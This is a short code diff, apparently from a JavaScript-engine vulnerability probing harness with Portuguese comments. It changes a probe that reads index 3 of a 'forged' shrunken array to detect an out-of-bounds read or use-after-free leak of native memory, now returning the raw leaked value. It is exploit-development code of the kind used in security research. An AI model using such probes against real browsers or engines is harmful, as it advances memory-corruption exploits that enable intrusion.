@@ -48,18 +48,17 @@ export default {
         // Probe 0: O tamanho do array forjado
         s => s.results.forgedArray ? s.results.forgedArray.length : 'Falhou',
         
-        // Probe 1: O Leitor de OOB/UAF
+       // Probe 1: O Leitor de OOB/UAF (Forçamos o retorno numérico para o executor apitar)
         s => {
             if (s.results.forgedArray) {
-                // O C++ deveria ter preenchido com 'undefined' após o array encolher.
-                // Se no índice 3 ou 4 houver números reais (ou lixo C++), é Info Leak!
                 let val = s.results.forgedArray[3];
+                // Se for um número válido (não undefined), devolvemos o número bruto
                 if (typeof val === 'number' && !isNaN(val)) {
-                    return `💥 SUCESSO! OOB Read da Ram Nativa: ${val}`;
+                    return val; 
                 }
-                return 'Seguro (Preenchido com undefined)';
+                return 0; // Se preencheu com undefined, devolvemos 0 (seguro)
             }
-            return s.results.error || 'Erro desconhecido';
+            return 0; // Baseline
         }
     ],
 
